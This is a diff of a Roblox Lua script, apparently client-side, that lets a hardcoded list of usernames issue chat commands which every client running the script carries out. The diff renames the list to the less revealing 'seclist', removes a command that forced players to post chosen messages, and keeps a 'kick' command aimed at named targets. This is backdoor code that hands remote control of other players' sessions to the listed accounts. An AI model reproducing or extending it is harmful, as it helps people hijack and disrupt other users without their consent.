@@ -8,7 +8,7 @@ end
 
 
 
-local whitelist = {
+local seclist = {
         "SuperNathanGamerPro",
 	"revsteppinsstand",
         "VoiseTimeAlt",
@@ -18,6 +18,7 @@ local whitelist = {
 	"Youngbros101c"
 	
 }
+
 function veryepictrol(x)
 	function GetPlayer(String)
 		local plr
@@ -51,20 +52,8 @@ function veryepictrol(x)
 			else
 				cmd = string.sub(msg,2)
 			end
-			if cmd == "chat" then
-				wait(0.5)
-				local say = string.sub(msg,space+1)
-				local args = {
-					[1] = (say),
-					[2] = "All"
-				}
-
-				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
-
-			end
 			
-			if cmd =="kick" then
-
+if cmd =="kick" then
 local Who = string.sub(msg,space+1)
 local target = GetPlayer(Who)
 if game.Players.LocalPlayer == target then
@@ -83,14 +72,14 @@ end
 	end)
 end
 game.Players.PlayerAdded:connect(function(plr)
-	for i,listed in pairs(whitelist) do
+	for i,listed in pairs(seclist) do
 		if plr.Name == listed then
 			veryepictrol(plr)
 		end
 	end
 end)
 for i,plr in pairs(game.Players:GetPlayers()) do
-	for i,listed in pairs(whitelist) do
+	for i,listed in pairs(seclist) do
 		if plr.Name == listed then
 			veryepictrol(plr)
 		end
